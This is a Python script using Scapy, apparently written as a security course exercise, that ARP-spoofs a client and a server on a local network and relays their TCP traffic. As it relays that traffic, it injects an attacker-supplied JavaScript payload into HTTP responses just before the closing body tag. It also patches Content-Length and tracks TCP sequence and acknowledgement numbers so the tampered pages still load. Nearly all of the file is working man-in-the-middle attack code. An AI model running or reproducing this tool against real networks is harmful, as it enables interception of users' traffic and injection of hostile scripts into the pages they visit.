# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
	arp_pack = ARP(op=1, hwsrc=attackerMAC, psrc=attackerIP, pdst=IP)
	response = sr1(arp_pack)
	return response.getlayer(ARP).hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    arp_pack = ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    send(arp_pack)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    arp_pack = ARP(op=2, hwsrc=srcMAC, psrc=srcIP, hwdst=dstMAC, pdst=dstIP)
    send(arp_pack)


# TODO: handle intercepted packets
def interceptor(packet):
	global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, inject_len,  clientACK, serverSEQ, flag, ack_dict, seq_dict
	# The packet should only be intercepted if it's caused from a spoofed ARP table
	if packet != None and packet.haslayer(IP) and packet.getlayer(Ether).src != attackerMAC and packet.getlayer(IP).src != attackerIP and packet.getlayer(IP).dst != attackerIP and packet.haslayer(TCP):
		# Scapy has the power to automatically fill in any empty attributes in any of the layers. so delete the things that need updating, and Scapy will fill them in accordingly
		del packet.getlayer(IP).len
		del packet.getlayer(IP).chksum
		del packet.getlayer(TCP).chksum

		#packet.show()
		if packet[Ether].src == clientMAC:
			debug(f"Currently on port {packet[TCP].sport}")
			if not (packet[TCP].sport in ack_dict):
				ack_dict[packet[TCP].sport] = packet[TCP].ack
		elif packet[Ether].src == serverMAC:
			debug(f"Currently on port {packet[TCP].dport}")
			if not (packet[TCP].dport in seq_dict):
				ack_dict[packet[TCP].dport] = packet[TCP].seq
				seq_dict[packet[TCP].dport] = packet[TCP].seq

		additional_bytes = 1

		if packet.getlayer(TCP).flags == "S":
			debug(f"The above packet is an HTTP SYN packet!")
			# Change the MAC addresses
			packet.getlayer(Ether).src = attackerMAC
			packet.getlayer(Ether).dst = serverMAC
			# Set flag to 0 (though it'll eventually be useless)
			flag = 0
			ack_dict[packet[TCP].sport] = packet[TCP].ack
			seq_dict[packet[TCP].sport] = 0
		elif packet.getlayer(TCP).flags == "SA":
			debug(f"The above packet is an HTTP SYN+ACK packet!")
			# Change the MAC addresses
			packet.getlayer(Ether).src = attackerMAC
			packet.getlayer(Ether).dst = clientMAC
			# Set the global clientSEQ and serverACK variables
			ack_dict[packet[TCP].dport] = packet[TCP].seq
			seq_dict[packet[TCP].dport] = packet[TCP].seq

		elif packet.haslayer(Raw):
			if packet[Ether].src == clientMAC:
				debug(f"The above packet is an HTTP request packet!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = serverMAC
			elif packet[Ether].src == serverMAC:
				debug(f"The above packet is an HTTP response packet!")
				debug(f"The old TCP length is {len(packet[Raw].load)}")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = clientMAC

				new_html = packet[Raw].load.decode('ascii')
				#debug(f"Old HTML is: {new_html}")

				# Check if this is the last HTTP response packet
				if new_html.find("</body>") != -1:
					# Inject the script in the response
					new_html = new_html.replace("</body>",script)
					# Set flag to 1
					flag=1

				# Check if the HTTP response has the content length parameter
				if new_html.find("Content-Length:") != -1:
					# Change the content length in the payload
					#debug(f"Old HTML is: {new_html}")
					end_index = new_html.find("Last-Modified:")
					start_index = new_html.find("Content-Length:")
					old_length = new_html[start_index+16:end_index-2]
					debug(f"The thing we took out is: {old_length}")
					new_length = int(old_length)+inject_len
					additional_digits = len(str(new_length)) - len(old_length)
					if additional_digits > 0:
						ack_dict[packet[TCP].dport] -= additional_digits
					new_html = new_html.replace("Content-Length: "+old_length,"Content-Length: "+str(new_length))
					#debug(f"New HTML is: {new_html}")

				additional_bytes = len(new_html)
				packet[Raw].load = new_html
				#debug(f"New HTML is: {new_html}")

				debug(f"The new TCP length is {len(packet[Raw].load)}")

		elif packet.getlayer(TCP).flags == "A":
			if packet.getlayer(Ether).src == clientMAC:
				debug(f"The above packet is an HTTP ACK packet from client!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = serverMAC
				#if flag == 1:
				#	debug(f"Original ACK is {packet[TCP].ack}")
				#	debug(f"Original SEQ is {packet[TCP].seq}")
				#	packet[TCP].ack -= inject_len
				#	debug(f"Script length is {len(script)}")
				#	debug(f"New ACK is {packet[TCP].ack}")
				#	debug(f"New SEQ is {packet[TCP].seq}")
			elif packet.getlayer(Ether).src == serverMAC:
				debug(f"The above packet is an HTTP ACK packet from web server!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = clientMAC
			additional_bytes = 0

		elif packet.getlayer(TCP).flags == "FA":
			if packet[Ether].src == clientMAC:
				debug(f"The above packet is an HTTP FIN+ACK packet from client!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = serverMAC
			elif packet[Ether].src == serverMAC:
				debug(f"The above packet is an HTTP FIN+ACK packet from web server!")
				# Change the MAC addresses
				packet[Ether].src = attackerMAC
				packet[Ether].dst = clientMAC

		elif packet[TCP].flags == "R":
			if packet[Ether].src == clientMAC:
				debug(f"The above packet is a RST packet from client!")
				# Change the MAC addresses
				packet.getlayer(Ether).src = attackerMAC
				packet.getlayer(Ether).dst = serverMAC
				ack_dict[packet[TCP].sport] = packet[TCP].ack
			elif packet[Ether].src == serverMAC:
				debug(f"The above packet is a RST packet from server!")
				# Change the MAC addresses
				packet[Ether].src = attackerMAC
				packet[Ether].dst = clientMAC
				seq_dict[packet[TCP].dport] = packet[TCP].seq

		debug(f"Original ACK is {packet[TCP].ack}")
		debug(f"Original SEQ is {packet[TCP].seq}")
		if packet[Ether].dst == serverMAC:
			packet[TCP].ack = ack_dict[packet[TCP].sport]
		# Only update the things when the server sends something to client
		else:
			packet[TCP].seq = seq_dict[packet[TCP].dport]
			if flag == 1:
				ack_dict[packet[TCP].dport] += len(packet[Raw].load) - inject_len
				seq_dict[packet[TCP].dport] += len(packet[Raw].load)
				flag = 0
			else:
				ack_dict[packet[TCP].dport] += additional_bytes
				seq_dict[packet[TCP].dport] += additional_bytes
		debug(f"New ACK is {packet[TCP].ack}")
		debug(f"New SEQ is {packet[TCP].seq}")

		#packet.show()
		sendp(packet)

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    attackerIP = get_if_addr(args.interface)
    clientIP = args.clientIP
    serverIP = args.serverIP
    script = "<script>"+args.script+"</script></body>"
    inject_len = len(script)-7
    flag = 0
    clientACK = 0
    serverSEQ = 0
    ack_dict = dict()
    seq_dict = dict()

    attackerMAC = get_if_hwaddr(args.interface)
    debug(f"Attacker MAC is {attackerMAC}")
    clientMAC = mac(clientIP)
    debug(f"Client MAC is {clientMAC}")
    serverMAC = mac(serverIP)
    debug(f"Server MAC is {serverMAC}")

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
